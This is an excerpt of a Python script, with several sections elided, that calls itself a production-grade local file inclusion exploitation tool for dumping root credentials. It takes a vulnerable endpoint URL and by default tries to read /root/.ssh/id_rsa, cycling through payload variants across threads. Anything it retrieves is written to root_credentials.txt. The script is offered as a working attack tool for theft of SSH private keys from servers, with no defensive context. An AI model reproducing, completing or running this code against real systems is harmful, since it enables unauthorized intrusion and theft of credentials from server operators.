...
def parse_args():
    parser = argparse.ArgumentParser(
        description="Production-grade LFI Exploitation Script for Dumping Root Credentials"
    )
    parser.add_argument("-u", "--url", required=True,
                        help=("Full vulnerable endpoint URL. "
                              "Example: http://jhigufutsal.com:65432/download-pdf?filename="))
    parser.add_argument("--file", default="/root/.ssh/id_rsa",
                        help="File path to dump (default: /root/.ssh/id_rsa)")
        ...
        if processed:
            with result_lock:
                if not found_event.is_set():
                    ...
                    outfile = "root_credentials.txt"
                    with open(outfile, "w") as f:
                        f.write(processed)
                    logging.info(f"[+] Root credentials saved to {outfile}")
                    found_event.set()
                    return full_url
        else:
...
def test_lfi_root(session, full_endpoints, target_file, path_as_is, threads):
    """
    Iterate through payload variants across all provided full endpoints until valid credentials are found.
    """
    logging.info("[+] Starting LFI tests to retrieve root credentials...")
    ...
    if not found_event.is_set():
        logging.info("[-] LFI targeting root credentials not exploitable with provided payloads.")
    return None
...
def main():
    ...
    result = test_lfi_root(session, full_endpoints, args.file, args.path_as_is, args.threads)
    end_time = time.time()
    ...
    if result:
        ...
        logging.info("Exploitation failed. No valid root credentials found.")
